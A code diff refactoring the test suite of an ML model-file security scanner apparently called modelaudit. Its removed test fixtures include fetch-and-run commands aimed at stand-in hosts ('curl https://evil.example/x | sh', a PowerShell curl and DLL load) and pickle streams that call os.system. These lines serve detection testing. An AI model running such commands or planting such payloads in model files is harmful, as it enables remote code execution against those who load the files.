@@ -27,12 +27,11 @@ from contextlib import contextmanager
 from dataclasses import replace
 from pathlib import Path
 from types import SimpleNamespace
-from typing import Any, Literal, cast
+from typing import Any, cast
 
 import pytest
 
 from modelaudit import core as core_module
-from modelaudit.analysis.unified_context import UnifiedMLContext
 from modelaudit.cache import get_cache_manager, reset_cache_manager
 from modelaudit.cache.optimized_config import normalize_material_scan_config
 from modelaudit.config import ModelAuditConfig, set_config
@@ -74,8 +73,6 @@ from modelaudit.utils.file.hdf5 import (
 )
 from modelaudit.utils.helpers import cache_decorator
 from modelaudit.utils.helpers.secure_hasher import SecureFileHasher
-from modelaudit.utils.tensorflow_compat import has_tensorflow_protobuf_stubs as _has_tf_protos
-from modelaudit.whitelists import POPULAR_MODELS
 from tests.helpers import (
     create_mock_coreml,
     create_mock_gguf,
@@ -85,9 +82,60 @@ from tests.helpers import (
     prefix_mock_onnx_with_unknown_field,
     prefix_mock_onnx_with_unknown_group,
 )
-from tests.helpers.file_creators import valid_jpeg_bytes, valid_png_bytes
+from tests.helpers.file_creators import (
+    SystemCommandPayload,
+    valid_jpeg_bytes,
+    valid_png_bytes,
+    write_sparse_safetensors_framing,
+)
+from tests.helpers.file_creators import (
+    build_line_broken_printable_utf8_ambiguous_binary_route as _build_line_broken_printable_utf8_ambiguous_binary_route,
+)
+from tests.helpers.file_creators import (
+    build_printable_utf8_ambiguous_binary_route as _build_printable_utf8_ambiguous_binary_route,
+)
+from tests.helpers.file_creators import pickle_binunicode as _core_binunicode
+from tests.helpers.file_creators import (
+    write_delayed_flax_cntk_overlap as _write_delayed_flax_cntk_overlap,
+)
+from tests.helpers.file_creators import (
+    write_hf_tokenizer_json as _write_hf_tokenizer_json,
+)
+from tests.helpers.file_creators import (
+    write_malicious_cntk as _write_malicious_cntk,
+)
+from tests.helpers.file_creators import (
+    write_malicious_lightgbm as _write_malicious_lightgbm,
+)
+from tests.helpers.file_creators import (
+    write_ordered_hf_tokenizer_json as _write_ordered_hf_tokenizer_json,
+)
+from tests.helpers.file_creators import (
+    write_truncated_ordered_hf_tokenizer_json as _write_truncated_ordered_hf_tokenizer_json,
+)
+from tests.helpers.scanners import install_zip_open_failure, scan_with_whitelisted_finding, without_keras_zip_scanner
+from tests.helpers.tensorflow import _build_malicious_tf_savedmodel, _require_tf_protos, build_malicious_tf_metagraph
 
 _SYSTEM_GLOBAL_NAMES = ("os.system", "posix.system", "nt.system")
+
+
+def _install_advanced_handler_selection(
+    monkeypatch: pytest.MonkeyPatch,
+    shard: Path,
+    captured_selection_allowed_paths: list[list[str] | None],
+    captured_allowed_targets: list[core_module.ValidatedShardTargets | None],
+) -> None:
+    def fake_should_use_advanced_handler(
+        path: str,
+        *,
+        allowed_shard_paths: list[str] | None = None,
+        allowed_shard_targets: core_module.ValidatedShardTargets | None = None,
+    ) -> bool:
+        captured_selection_allowed_paths.append(allowed_shard_paths)
+        captured_allowed_targets.append(allowed_shard_targets)
+        return path == str(shard)
+
+    monkeypatch.setattr(core_module, "should_use_advanced_handler", fake_should_use_advanced_handler)
 
 
 def test_streaming_precomputed_remote_safetensors_result_skips_local_hash(
@@ -346,38 +394,6 @@ def _valid_elf64_header() -> bytes:
     return bytes(header)
 
 
-def _write_hf_tokenizer_json(path: Path, extra_fields: dict[str, Any] | None = None) -> Path:
-    payload: dict[str, Any] = {
-        "version": "1.0",
-        "added_tokens": [],
-        "model": {
-            "type": "BPE",
-            "vocab": {"hello": 0},
-            "merges": [],
-        },
-    }
-    if extra_fields:
-        payload.update(extra_fields)
-    path.write_text(json.dumps(payload), encoding="utf-8")
-    return path
-
-
-def _write_ordered_hf_tokenizer_json(
-    path: Path,
-    *,
-    late_fields: str = "",
-    padding_size: int = 0,
-    model_fields: str = '"type":"BPE","vocab":{"hello":0},"merges":[]',
-    version_json: str = '"1.0"',
-) -> Path:
-    padding = f',"padding":"{"x" * padding_size}"' if padding_size else ""
-    path.write_text(
-        (f'{{"version":{version_json},"added_tokens":[],"model":{{{model_fields}}}{padding}{late_fields}}}'),
-        encoding="utf-8",
-    )
-    return path
-
-
 def _write_streamed_hf_tokenizer_json(path: Path, *, padding_size: int) -> Path:
     path.parent.mkdir(parents=True, exist_ok=True)
     with path.open("w", encoding="utf-8") as handle:
@@ -391,18 +407,6 @@ def _write_streamed_hf_tokenizer_json(path: Path, *, padding_size: int) -> Path:
             handle.write(chunk[:current])
             remaining -= current
         handle.write('"}')
-    return path
-
-
-def _write_truncated_ordered_hf_tokenizer_json(path: Path, *, padding_size: int) -> Path:
-    path.write_text(
-        (
-            '{"version":"1.0","added_tokens":[],'
-            '"model":{"type":"BPE","vocab":{"hello":0},"merges":[]},'
-            f'"padding":"{"x" * padding_size}'
-        ),
-        encoding="utf-8",
-    )
     return path
 
 
@@ -506,18 +510,7 @@ def _build_malicious_pickle(*, protocol: int | None = None) -> bytes:
     """Build a tiny pickle payload that exercises nested dangerous-opcode scanning."""
     import os as os_module
 
-    class DangerousPayload:
-        """Serializable payload that reduces to a shell command invocation."""
-
-        def __reduce__(self) -> tuple[Any, tuple[str]]:
-            """Return a dangerous reducer target for scanner regression coverage."""
-            return (os_module.system, ("echo core-dispatch-test",))
-
-    return pickle.dumps(DangerousPayload(), protocol=protocol)
-
-
-def _core_binunicode(data: bytes) -> bytes:
-    return b"X" + len(data).to_bytes(4, "little") + data
+    return pickle.dumps(SystemCommandPayload("echo core-dispatch-test", lambda: os_module.system), protocol=protocol)
 
 
 def _core_legacy_pytorch_object_stream(
@@ -597,16 +590,6 @@ def _build_protocolless_binary_malicious_pickle() -> bytes:
 def _build_protocolless_binary_benign_scalar_pickle() -> bytes:
     """Build a harmless binary pickle scalar without the optional PROTO opcode."""
     return b"\x8c\x02os\x94."
-
-
-def _build_printable_utf8_ambiguous_binary_route() -> bytes:
-    """Build printable UTF-8 bytes that still require binary fail-closed routing."""
-    return (b'""' + ("é" * 17).encode("utf-8")) * 4097
-
-
-def _build_line_broken_printable_utf8_ambiguous_binary_route() -> bytes:
-    """Build line-broken printable UTF-8 bytes requiring binary fail-closed routing."""
-    return (b'""' + ("é" * 17).encode("utf-8") + b"\n") * 4097
 
 
 def _build_printable_utf8_protobuf_candidate_route() -> bytes:
@@ -778,11 +761,6 @@ def test_scan_file_media_pickle_polyglot_detects_system_global(tmp_path: Path) -
     _assert_system_pickle_issue(result)
 
 
-def _require_tf_protos() -> None:
-    if not _has_tf_protos():
-        pytest.skip("TensorFlow protobuf stubs unavailable")
-
-
 def test_tensorflow_protobuf_bootstrap_avoids_shadow_package(tmp_path: Path) -> None:
     shadow_root = tmp_path / "shadow"
     shadow_tensorflow = shadow_root / "tensorflow"
@@ -892,31 +870,7 @@ def test_tensorflow_trusted_root_honors_user_site_enablement(
 
 
 def _build_malicious_tf_metagraph() -> bytes:
-    _require_tf_protos()
-    import modelaudit.protos  # noqa: F401
-
-    meta_graph_pb2 = importlib.import_module("tensorflow.core.protobuf.meta_graph_pb2")
-    metagraph = meta_graph_pb2.MetaGraphDef()
-    metagraph.meta_info_def.meta_graph_version = "modelaudit_route_test"
-    node = metagraph.graph_def.node.add()
-    node.name = "pyfunc_node"
-    node.op = "PyFunc"
-    node.attr["func"].s = b"python -c 'import os; os.system(\"curl https://evil.example/x | sh\")'"
-    return cast(bytes, metagraph.SerializeToString())
-
-
-def _build_malicious_tf_savedmodel() -> bytes:
-    _require_tf_protos()
-    import modelaudit.protos  # noqa: F401
-
-    saved_model_pb2 = importlib.import_module("tensorflow.core.protobuf.saved_model_pb2")
-    saved_model = saved_model_pb2.SavedModel()
-    saved_model.saved_model_schema_version = 1
-    metagraph = saved_model.meta_graphs.add()
-    node = metagraph.graph_def.node.add()
-    node.name = "pyfunc_node"
-    node.op = "PyFunc"
-    return cast(bytes, saved_model.SerializeToString())
+    return build_malicious_tf_metagraph("modelaudit_route_test")
 
 
 def _write_orbax_metadata(directory: Path, *, restore_fn: str | None = None) -> Path:
@@ -997,15 +951,8 @@ def test_directory_scan_invokes_orbax_owner_once_and_keeps_clean_result(
 ) -> None:
     model_dir = tmp_path / "orbax-model"
     metadata_path = _write_orbax_metadata(model_dir)
-    owner_calls: list[Path] = []
-    original_scan = JaxCheckpointScanner.scan
 
-    def record_owner_scan(scanner: JaxCheckpointScanner, path: str) -> ScanResult:
-        if Path(path).is_dir():
-            owner_calls.append(Path(path).resolve())
-        return original_scan(scanner, path)
-
-    monkeypatch.setattr(JaxCheckpointScanner, "scan", record_owner_scan)
+    owner_calls = _record_directory_owner_scans(monkeypatch, JaxCheckpointScanner)
 
     result = scan_model_directory_or_file(str(model_dir), cache_scan_results=False)
 
@@ -1084,15 +1031,7 @@ def test_directory_scan_invokes_savedmodel_directory_owner_once(
     model_dir = tmp_path / "saved-model"
     model_dir.mkdir()
     (model_dir / "saved_model.pb").write_bytes(_build_malicious_tf_savedmodel())
-    owner_calls: list[Path] = []
-    original_scan = TensorFlowSavedModelScanner.scan
-
-    def record_savedmodel_scan(scanner: TensorFlowSavedModelScanner, path: str) -> ScanResult:
-        if Path(path).is_dir():
-            owner_calls.append(Path(path).resolve())
-        return original_scan(scanner, path)
-
-    monkeypatch.setattr(TensorFlowSavedModelScanner, "scan", record_savedmodel_scan)
+    owner_calls = _record_directory_owner_scans(monkeypatch, TensorFlowSavedModelScanner)
 
     result = scan_model_directory_or_file(str(model_dir), cache_scan_results=False)
 
@@ -1214,13 +1153,7 @@ def test_directory_scan_does_not_follow_external_orbax_marker_before_containment
     model_dir.mkdir()
     marker_path = model_dir / "metadata.json"
     marker_path.symlink_to(outside_metadata)
-    owner_calls: list[str] = []
-
-    def record_owner_scan(_scanner: JaxCheckpointScanner, owner_path: str) -> ScanResult:
-        owner_calls.append(owner_path)
-        raise AssertionError("owner scan must not run before path containment")
-
-    monkeypatch.setattr(JaxCheckpointScanner, "scan", record_owner_scan)
+    owner_calls = _reject_owner_before_containment(monkeypatch, JaxCheckpointScanner)
 
     result = scan_model_directory_or_file(str(model_dir), cache_scan_results=False)
 
@@ -1252,13 +1185,7 @@ def test_directory_scan_does_not_follow_external_savedmodel_marker_before_contai
     model_dir.mkdir()
     marker_path = model_dir / "saved_model.pb"
     marker_path.symlink_to(outside_model)
-    owner_calls: list[str] = []
-
-    def record_owner_scan(_scanner: TensorFlowSavedModelScanner, owner_path: str) -> ScanResult:
-        owner_calls.append(owner_path)
-        raise AssertionError("owner scan must not run before path containment")
-
-    monkeypatch.setattr(TensorFlowSavedModelScanner, "scan", record_owner_scan)
+    owner_calls = _reject_owner_before_containment(monkeypatch, TensorFlowSavedModelScanner)
 
     result = scan_model_directory_or_file(str(model_dir), cache_scan_results=False)
 
@@ -1301,15 +1228,7 @@ def test_unrelated_external_symlink_does_not_suppress_savedmodel_owner_scan(
     outside_variable.write_bytes(b"opaque tensor values")
     unrelated_link = variables_dir / "variables.data-00000-of-00001"
     unrelated_link.symlink_to(outside_variable)
-    owner_calls: list[Path] = []
-    original_scan = TensorFlowSavedModelScanner.scan
-
-    def record_savedmodel_scan(scanner: TensorFlowSavedModelScanner, owner_path: str) -> ScanResult:
-        if Path(owner_path).is_dir():
-            owner_calls.append(Path(owner_path).resolve())
-        return original_scan(scanner, owner_path)
-
-    monkeypatch.setattr(TensorFlowSavedModelScanner, "scan", record_savedmodel_scan)
+    owner_calls = _record_directory_owner_scans(monkeypatch, TensorFlowSavedModelScanner)
 
     result = scan_model_directory_or_file(str(model_dir), cache_scan_results=False)
 
@@ -1609,13 +1528,7 @@ def test_directory_scan_uses_descriptor_cwd_when_owner_fd_paths_are_unavailable(
 ) -> None:
     model_dir = tmp_path / "orbax-model"
     _write_orbax_metadata(model_dir)
-    original_stat = Path.stat
     owner_paths: list[tuple[str, Path]] = []
-
-    def hide_descriptor_aliases(candidate: Path, *args: Any, **kwargs: Any) -> os.stat_result:
-        if str(candidate).startswith(("/proc/self/fd/", "/dev/fd/")):
-            raise FileNotFoundError(str(candidate))
-        return original_stat(candidate, *args, **kwargs)
 
     def record_owner_scan(_scanner: JaxCheckpointScanner, owner_path: str) -> ScanResult:
         if Path(owner_path).is_dir():
@@ -1624,7 +1537,7 @@ def test_directory_scan_uses_descriptor_cwd_when_owner_fd_paths_are_unavailable(
         owner_result.finish()
         return owner_result
 
-    monkeypatch.setattr(Path, "stat", hide_descriptor_aliases)
+    _hide_descriptor_paths(monkeypatch)
     monkeypatch.setattr(JaxCheckpointScanner, "scan", record_owner_scan)
 
     result = scan_model_directory_or_file(str(model_dir), cache_scan_results=False)
@@ -1650,23 +1563,10 @@ def test_directory_scan_uses_staged_snapshot_without_descriptor_owner_binding(
         ),
         encoding="utf-8",
     )
-    original_stat = Path.stat
-    owner_paths: list[Path] = []
-    original_scan = JaxCheckpointScanner.scan
 
-    def hide_descriptor_aliases(candidate: Path, *args: Any, **kwargs: Any) -> os.stat_result:
-        if str(candidate).startswith(("/proc/self/fd/", "/dev/fd/")):
-            raise FileNotFoundError(str(candidate))
-        return original_stat(candidate, *args, **kwargs)
-
-    def record_owner_scan(scanner: JaxCheckpointScanner, owner_path: str) -> ScanResult:
-        if Path(owner_path).is_dir():
-            owner_paths.append(Path(owner_path).resolve())
-        return original_scan(scanner, owner_path)
-
-    monkeypatch.setattr(Path, "stat", hide_descriptor_aliases)
+    _hide_descriptor_paths(monkeypatch)
     monkeypatch.setattr(os, "fchdir", None, raising=False)
-    monkeypatch.setattr(JaxCheckpointScanner, "scan", record_owner_scan)
+    owner_paths = _record_directory_owner_scans(monkeypatch, JaxCheckpointScanner)
 
     result = scan_model_directory_or_file(str(model_dir), cache_scan_results=False)
     owner_metadata = result.file_metadata[str(model_dir)]
@@ -2461,9 +2361,7 @@ def test_savedmodel_owner_allows_large_file_backed_hdf5_child(
     _write_large_benign_keras_hdf5(hdf5_path)
 
     hdf5_scans: list[Path] = []
-    owner_calls: list[Path] = []
     original_hdf5_scan = KerasH5Scanner.scan
-    original_owner_scan = TensorFlowSavedModelScanner.scan
     original_hash = core_module._calculate_file_hash
 
     def record_hdf5_scan(scanner: KerasH5Scanner, path: str) -> ScanResult:
@@ -2471,18 +2369,13 @@ def test_savedmodel_owner_allows_large_file_backed_hdf5_child(
             hdf5_scans.append(Path(path).resolve())
         return original_hdf5_scan(scanner, path)
 
-    def record_owner_scan(scanner: TensorFlowSavedModelScanner, owner_path: str) -> ScanResult:
-        if Path(owner_path).is_dir():
-            owner_calls.append(Path(owner_path).resolve())
-        return original_owner_scan(scanner, owner_path)
-
     def reject_large_hdf5_hash(path: str, *, deadline: float | None = None) -> str:
         if Path(path).resolve() == hdf5_path.resolve():
             pytest.fail("large file-backed HDF5 child must not be whole-file hashed")
         return original_hash(path, deadline=deadline)
 
     monkeypatch.setattr(KerasH5Scanner, "scan", record_hdf5_scan)
-    monkeypatch.setattr(TensorFlowSavedModelScanner, "scan", record_owner_scan)
+    owner_calls = _record_directory_owner_scans(monkeypatch, TensorFlowSavedModelScanner)
     monkeypatch.setattr(core_module, "_calculate_file_hash", reject_large_hdf5_hash)
 
     result = scan_model_directory_or_file(str(model_dir), cache_enabled=False)
@@ -2734,10 +2627,7 @@ def _write_sparse_oversized_safetensors_candidate(
     path: Path,
     header_len: int = SAFETENSORS_ROUTING_HEADER_PARSE_BYTES + 1,
 ) -> None:
-    with path.open("wb") as handle:
-        handle.write(struct.pack("<Q", header_len))
-        handle.write(b"{")
-        handle.truncate(8 + header_len + 1)
+    write_sparse_safetensors_framing(path, header_len)
 
 
 def _write_sparse_safetensors_delayed_flax_overlap(path: Path) -> None:
@@ -3021,35 +2911,6 @@ def test_hdf5_signature_probe_rejects_corrupted_v2_checksum(tmp_path: Path) -> N
     polyglot.write_bytes(payload)
 
     assert find_hdf5_signature_offset(str(polyglot)) is None
-
-
-def _write_malicious_cntk(path: Path, include_structure: bool = True) -> None:
-    prefix = b"\x08\x01\x12\x11\x0a\x07version\x12\x06\x08\x01\x10\x03(\x02\x12\x09\x0a\x03uid\x12\x02ab"
-    structure = b" CompositeFunction primitive_functions " if include_structure else b""
-    payload = b" native_user_function loadlibrary C:\\temp\\evil.dll powershell -c curl http://evil.example/p.sh "
-    path.write_bytes(prefix + structure + payload)
-
-
-def _write_delayed_flax_cntk_overlap(path: Path) -> None:
-    prefix = b"\x08\x01\x12\x11\x0a\x07version\x12\x06\x08\x01\x10\x03(\x02\x12\x09\x0a\x03uid\x12\x02ab"
-    structure = b" CompositeFunction primitive_functions "
-    delayed_flax_root = flax_msgpack_scanner.msgpack.packb(
-        {"params": {"w": [1, 2, 3]}, "__reduce__": "attacker_callable"},
-        use_bin_type=True,
-    )
-    path.write_bytes(prefix + structure + (b"\xc0" * (FLAX_MSGPACK_STRUCTURE_READ_BYTES + 1)) + delayed_flax_root)
-
-
-def _write_malicious_lightgbm(path: Path, valid: bool = True) -> None:
-    body = "tree=0\nversion=v4\nnum_class=1\n"
-    if valid:
-        body += (
-            "num_tree_per_iteration=1\nmax_feature_idx=2\ntree_sizes=12\nnum_leaves=2\n"
-            "split_feature=0\nleaf_value=0.1 0.2\n"
-            "metadata=os.system('curl https://collector.evil.example/payload.sh | sh')\n"
-            "callback_url=https://collector.evil.example/payload.sh\n"
-        )
-    path.write_text(body, encoding="utf-8")
 
 
 def _create_zip_with_ordered_entries(path: Path, entries: list[tuple[str, bytes]]) -> None:
@@ -3350,15 +3211,7 @@ def test_directory_scan_groups_hf_cache_sharded_symlinks(
         blob_paths.append(blob_path.resolve())
         shard_links.append(shard_link)
 
-    captured_configs: list[dict[str, Any]] = []
-    calls: list[str] = []
-
-    def fake_scan_file(path: str, config: dict[str, Any] | None = None) -> ScanResult:
-        calls.append(path)
-        captured_configs.append(dict(config or {}))
-        return _mock_sharded_scan_result(sum(blob_path.stat().st_size for blob_path in blob_paths))
-
-    monkeypatch.setattr(core_module, "scan_file", fake_scan_file)
+    captured_configs, calls = _record_shard_scans(monkeypatch, blob_paths)
 
     result = core_module.scan_model_directory_or_file(str(snapshots_dir), cache_scan_results=False)
 
@@ -3679,15 +3532,7 @@ def test_directory_scan_deduplicates_identical_hf_shard_families_across_snapshot
                 Path("../../blobs") / blob_path.name
             )
 
-    captured_configs: list[dict[str, Any]] = []
-    calls: list[str] = []
-
-    def fake_scan_file(path: str, config: dict[str, Any] | None = None) -> ScanResult:
-        calls.append(path)
-        captured_configs.append(dict(config or {}))
-        return _mock_sharded_scan_result(sum(blob_path.stat().st_size for blob_path in blob_paths))
-
-    monkeypatch.setattr(core_module, "scan_file", fake_scan_file)
+    captured_configs, calls = _record_shard_scans(monkeypatch, blob_paths)
 
     result = core_module.scan_model_directory_or_file(str(cache_dir / "snapshots"), cache_scan_results=False)
 
@@ -3774,13 +3619,7 @@ def test_directory_scan_keeps_distinct_hf_shard_filename_patterns(
             snapshot.mkdir(parents=True, exist_ok=True)
             (snapshot / filename).symlink_to(Path("../../blobs") / blob_path.name)
 
-    calls: list[str] = []
-
-    def fake_scan_file(path: str, config: dict[str, Any] | None = None) -> ScanResult:
-        calls.append(path)
-        return _mock_sharded_scan_result(sum(blob_path.stat().st_size for blob_path in blob_paths))
-
-    monkeypatch.setattr(core_module, "scan_file", fake_scan_file)
+    calls = _record_shard_calls(monkeypatch, blob_paths)
 
     result = core_module.scan_model_directory_or_file(str(cache_dir / "snapshots"), cache_scan_results=False)
 
@@ -3808,13 +3647,7 @@ def test_directory_scan_deduplicates_hf_shard_aliases_against_raw_blobs(
         blob_paths.append(blob_path.resolve())
         (snapshot / f"model-{shard_index:05d}-of-00002.safetensors").symlink_to(Path("../../blobs") / blob_path.name)
 
-    calls: list[str] = []
-
-    def fake_scan_file(path: str, config: dict[str, Any] | None = None) -> ScanResult:
-        calls.append(path)
-        return _mock_sharded_scan_result(sum(blob_path.stat().st_size for blob_path in blob_paths))
-
-    monkeypatch.setattr(core_module, "scan_file", fake_scan_file)
+    calls = _record_shard_calls(monkeypatch, blob_paths)
 
     result = core_module.scan_model_directory_or_file(str(cache_dir), cache_scan_results=False)
 
@@ -3917,17 +3750,7 @@ def test_scan_file_passes_shard_allowlist_to_advanced_handler(
         result.finish(success=True)
         return result
 
-    def fake_should_use_advanced_handler(
-        path: str,
-        *,
-        allowed_shard_paths: list[str] | None = None,
-        allowed_shard_targets: core_module.ValidatedShardTargets | None = None,
-    ) -> bool:
-        captured_selection_allowed_paths.append(allowed_shard_paths)
-        captured_allowed_targets.append(allowed_shard_targets)
-        return path == str(shard)
-
-    monkeypatch.setattr(core_module, "should_use_advanced_handler", fake_should_use_advanced_handler)
+    _install_advanced_handler_selection(monkeypatch, shard, captured_selection_allowed_paths, captured_allowed_targets)
     monkeypatch.setattr(core_module, "_select_preferred_scanner_id", fake_select_preferred_scanner_id)
     monkeypatch.setattr(core_module._registry, "get_scanner_for_path", fake_get_scanner_for_path)
     monkeypatch.setattr(core_module, "scan_advanced_large_file", fake_scan_advanced_large_file)
@@ -4378,17 +4201,7 @@ def test_scan_file_passes_shard_allowlist_to_preferred_advanced_handler(
         result.finish(success=True)
         return result
 
-    def fake_should_use_advanced_handler(
-        path: str,
-        *,
-        allowed_shard_paths: list[str] | None = None,
-        allowed_shard_targets: core_module.ValidatedShardTargets | None = None,
-    ) -> bool:
-        captured_selection_allowed_paths.append(allowed_shard_paths)
-        captured_allowed_targets.append(allowed_shard_targets)
-        return path == str(shard)
-
-    monkeypatch.setattr(core_module, "should_use_advanced_handler", fake_should_use_advanced_handler)
+    _install_advanced_handler_selection(monkeypatch, shard, captured_selection_allowed_paths, captured_allowed_targets)
     monkeypatch.setattr(core_module, "_select_preferred_scanner_id", fake_select_preferred_scanner_id)
     monkeypatch.setattr(core_module._registry, "load_scanner_by_id", lambda scanner_id: DummyPreferredScanner)
     monkeypatch.setattr(
@@ -5281,18 +5094,9 @@ def test_scan_file_routes_empty_module_stack_global_safetensors_collision_to_pic
 
 
 def test_scan_file_keeps_empty_bytes_stack_global_safetensors_collision_clean(tmp_path: Path) -> None:
-    polyglot = tmp_path / "empty-bytes-stack-global.unknown"
-    _write_safetensors_pickle_tail(polyglot, ord("V"), b"\n0C\x00\x8c\x02os\x93.")
-
-    assert file_detection.detect_file_format(str(polyglot)) == "safetensors"
-    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "safetensors"
-    assert file_detection.detect_file_format_for_skip_filter(str(polyglot)) == "safetensors"
-
-    result = scan_file(str(polyglot), config={"cache_enabled": False})
-
-    assert result.scanner_name == "safetensors"
-    assert result.success is True
-    assert not result.issues
+    _assert_empty_stack_global_collision_clean(
+        tmp_path, ("empty-bytes-stack-global.unknown"), (b"\n0C\x00\x8c\x02os\x93.")
+    )
 
 
 def test_scan_file_routes_security_pickle_after_early_frame_stop(tmp_path: Path) -> None:
@@ -5312,48 +5116,21 @@ def test_scan_file_routes_security_pickle_after_early_frame_stop(tmp_path: Path)
 
 
 def test_scan_file_routes_security_pickle_after_valid_list_setitem(tmp_path: Path) -> None:
-    pickle_tail = b"\n0]NaK\x00Ns0cos\nsystem\n(Vtrue\ntR."
-    polyglot = tmp_path / "list-setitem.unknown"
-    _write_safetensors_pickle_tail(polyglot, ord("V"), pickle_tail)
-
-    assert file_detection.detect_file_format(str(polyglot)) == "pickle"
-    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "pickle"
-    assert file_detection.detect_file_format_for_skip_filter(str(polyglot)) == "pickle"
-
-    result = scan_file(str(polyglot), config={"cache_enabled": False})
-
-    assert result.scanner_name == "pickle"
-    _assert_system_pickle_issue(result)
+    _assert_safetensors_pickle_stack_routing(
+        tmp_path, (b"\n0]NaK\x00Ns0cos\nsystem\n(Vtrue\ntR."), ("list-setitem.unknown")
+    )
 
 
 def test_scan_file_routes_security_pickle_after_memoized_list_mutation(tmp_path: Path) -> None:
-    pickle_tail = b"\n0]\x94Na0h\x00K\x00Ns0cos\nsystem\n(Vtrue\ntR."
-    polyglot = tmp_path / "memoized-list-mutation.unknown"
-    _write_safetensors_pickle_tail(polyglot, ord("V"), pickle_tail)
-
-    assert file_detection.detect_file_format(str(polyglot)) == "pickle"
-    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "pickle"
-    assert file_detection.detect_file_format_for_skip_filter(str(polyglot)) == "pickle"
-
-    result = scan_file(str(polyglot), config={"cache_enabled": False})
-
-    assert result.scanner_name == "pickle"
-    _assert_system_pickle_issue(result)
+    _assert_safetensors_pickle_stack_routing(
+        tmp_path, (b"\n0]\x94Na0h\x00K\x00Ns0cos\nsystem\n(Vtrue\ntR."), ("memoized-list-mutation.unknown")
+    )
 
 
 def test_scan_file_routes_security_pickle_after_boolean_list_index(tmp_path: Path) -> None:
-    pickle_tail = b"\n0]Na\x89Ns0cos\nsystem\n(Vtrue\ntR."
-    polyglot = tmp_path / "boolean-list-index.unknown"
-    _write_safetensors_pickle_tail(polyglot, ord("V"), pickle_tail)
-
-    assert file_detection.detect_file_format(str(polyglot)) == "pickle"
-    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "pickle"
-    assert file_detection.detect_file_format_for_skip_filter(str(polyglot)) == "pickle"
-
-    result = scan_file(str(polyglot), config={"cache_enabled": False})
-
-    assert result.scanner_name == "pickle"
-    _assert_system_pickle_issue(result)
+    _assert_safetensors_pickle_stack_routing(
+        tmp_path, (b"\n0]Na\x89Ns0cos\nsystem\n(Vtrue\ntR."), ("boolean-list-index.unknown")
+    )
 
 
 @pytest.mark.parametrize(
@@ -5546,18 +5323,9 @@ def test_scan_file_routes_large_safetensors_pickle_from_declared_frame_end(tmp_p
 
 
 def test_scan_file_keeps_failed_pickle_load_with_memo_safetensors_collision_clean(tmp_path: Path) -> None:
-    polyglot = tmp_path / "failed-load-with-memo.unknown"
-    _write_safetensors_pickle_tail(polyglot, ord("V"), b"\n0]q\x00acos\nsystem\n.")
-
-    assert file_detection.detect_file_format(str(polyglot)) == "safetensors"
-    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "safetensors"
-    assert file_detection.detect_file_format_for_skip_filter(str(polyglot)) == "safetensors"
-
-    result = scan_file(str(polyglot), config={"cache_enabled": False})
-
-    assert result.scanner_name == "safetensors"
-    assert result.success is True
-    assert not result.issues
+    _assert_empty_stack_global_collision_clean(
+        tmp_path, ("failed-load-with-memo.unknown"), (b"\n0]q\x00acos\nsystem\n.")
+    )
 
 
 def test_pickle_frame_alternates_share_one_work_budget() -> None:
@@ -5715,18 +5483,9 @@ def test_scan_file_keeps_known_type_invalid_pickle_safetensors_clean(
 
 
 def test_scan_file_routes_none_state_build_safetensors_overlap_to_pickle(tmp_path: Path) -> None:
-    pickle_tail = b"\n0NNbcos\nsystem\n(Vtrue\ntR."
-    polyglot = tmp_path / "none-state-build-pickle.unknown"
-    _write_safetensors_pickle_tail(polyglot, ord("V"), pickle_tail)
-
-    assert file_detection.detect_file_format(str(polyglot)) == "pickle"
-    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "pickle"
-    assert file_detection.detect_file_format_for_skip_filter(str(polyglot)) == "pickle"
-
-    result = scan_file(str(polyglot), config={"cache_enabled": False})
-
-    assert result.scanner_name == "pickle"
-    _assert_system_pickle_issue(result)
+    _assert_safetensors_pickle_stack_routing(
+        tmp_path, (b"\n0NNbcos\nsystem\n(Vtrue\ntR."), ("none-state-build-pickle.unknown")
+    )
 
 
 def test_scan_file_merges_safetensors_findings_for_pickle_overlap(tmp_path: Path) -> None:
@@ -7148,52 +6907,14 @@ def test_scan_file_selected_pickle_does_not_claim_nested_binary_header_like_flax
 
 
 def test_scan_file_preserves_binary_pickle_findings_when_stop_follows_probe_window(tmp_path: Path) -> None:
-    if not flax_msgpack_scanner.HAS_MSGPACK:
-        pytest.skip("msgpack unavailable")
-
-    checkpoint = tmp_path / "delayed-binary-pickle-stop.jpg"
-    pickle_stream = (
-        b"\x80\x04cos\nsystem\n(S'echo pwned'\ntR" + (b"N0" * (file_detection.PROTO0_1_MAX_PROBE_BYTES // 2 + 1)) + b"."
-    )
-    checkpoint.write_bytes(
-        pickle_stream
-        + flax_msgpack_scanner.msgpack.packb(
-            {"params": {"w": [1, 2, 3]}},
-            use_bin_type=True,
-        )
-    )
-
-    result = scan_file(str(checkpoint), config={"cache_scan_results": False})
-
-    assert result.scanner_name == "flax_msgpack"
-    assert any(
-        issue.rule_code == "S201" and any(global_name in issue.message.lower() for global_name in _SYSTEM_GLOBAL_NAMES)
-        for issue in result.issues
+    _assert_late_pickle_stop_in_msgpack(
+        tmp_path, ("delayed-binary-pickle-stop.jpg"), (b"\x80\x04cos\nsystem\n(S'echo pwned'\ntR"), (b".")
     )
 
 
 def test_scan_file_preserves_binary_pickle_findings_when_dangerous_opcode_follows_probe_window(tmp_path: Path) -> None:
-    if not flax_msgpack_scanner.HAS_MSGPACK:
-        pytest.skip("msgpack unavailable")
-
-    checkpoint = tmp_path / "late-binary-pickle-dangerous-global.jpg"
-    pickle_stream = (
-        b"\x80\x04" + (b"N0" * (file_detection.PROTO0_1_MAX_PROBE_BYTES // 2 + 1)) + b"cos\nsystem\n(S'echo pwned'\ntR."
-    )
-    checkpoint.write_bytes(
-        pickle_stream
-        + flax_msgpack_scanner.msgpack.packb(
-            {"params": {"w": [1, 2, 3]}},
-            use_bin_type=True,
-        )
-    )
-
-    result = scan_file(str(checkpoint), config={"cache_scan_results": False})
-
-    assert result.scanner_name == "flax_msgpack"
-    assert any(
-        issue.rule_code == "S201" and any(global_name in issue.message.lower() for global_name in _SYSTEM_GLOBAL_NAMES)
-        for issue in result.issues
+    _assert_late_pickle_stop_in_msgpack(
+        tmp_path, ("late-binary-pickle-dangerous-global.jpg"), (b"\x80\x04"), (b"cos\nsystem\n(S'echo pwned'\ntR.")
     )
 
 
